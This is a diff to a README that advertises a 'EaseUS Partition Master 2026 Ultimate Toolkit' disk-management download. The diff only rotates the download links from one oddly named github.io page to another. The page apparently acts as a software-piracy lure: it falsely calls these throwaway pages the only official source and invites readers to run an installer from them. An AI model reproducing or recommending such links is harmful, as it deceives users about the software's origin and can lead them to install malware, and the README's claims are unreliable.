@@ -2,7 +2,7 @@
 
 Welcome to the EaseUS Partition Master 2026 Ultimate Toolkit, your comprehensive solution for disk partitioning and management on Windows 10 and 11 systems. This powerful tool is designed to help you resize, clone, and optimize hard drives with ease, making it ideal for both personal and professional use. Whether you need to recover lost data or migrate your OS, this toolkit provides reliable features without the hassle of using cracks or unreliable methods.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Overview
 
@@ -66,7 +66,7 @@ While partition tools are generally safe, always back up important data before m
 
 To access the latest version of EaseUS Partition Master 2026 Ultimate Toolkit, please use the link below. This is the only official download source for this repository.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 The download page is regularly updated with new features, bug fixes, and compatibility improvements. Last updated: 2026. Ensure you download only from trusted sources to maintain software integrity.
 
